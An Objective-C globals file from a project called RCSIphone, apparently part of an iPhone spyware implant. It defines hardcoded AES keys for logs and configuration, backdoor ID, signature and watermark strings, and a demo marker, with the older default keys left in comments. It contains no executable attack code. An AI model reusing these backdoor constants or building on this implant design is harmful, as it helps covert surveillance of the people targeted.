//
//  RCSIGlobals.m
//  RCSIphone
//
//  Created by armored on 8/20/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "RCSIGlobals.h"

// old binary strings
//char gLogAesKey[]         = "3j9WmmDgBqyU270FTid3719g64bP4s52"; // default
//char gConfAesKey[]        = "Adf5V57gQtyi90wUhpb8Neg56756j87R"; // default
//char gInstanceId[]        = "bg5etG87q20Kg52W5Fg1";
//char gBackdoorID[]        = "av3pVck1gb4eR2d8"; // default
//char gBackdoorSignature[] = "f7Hk0f5usd04apdvqw13F5ed25soV5eD"; //default

char gLogAesKey[]         = "WfClq6HxbSaOuJGaH5kWXr7dQgjYNSNg"; 
char gConfAesKey[]        = "6uo_E0S4w_FD0j9NEhW2UpFw9rwy90LY"; 
char gBackdoorID[]        = "EMp7Ca7-fpOBIrXX";                 // last "XX" for string terminating in rcsmmain.m
char gBackdoorSignature[] = "ANgs9oGFnEL_vxTxe9eIyBx5lZxfd6QZ"; 
char gBackdoorPseduoSign[]= "B3lZ3bupLuI4p7QEPDgNyWacDzNmk1pW"; // watermark

// Demo marker: se la stringa e' uguale a "hxVtdxJ/Z8LvK3ULSnKRUmLE"
// allora e' in demo altrimenti no demo.
char gDemoMarker[] = "Pg-WaVyPzMMMMmGbhP6qAigT";

u_int gVersion     = 2013031101;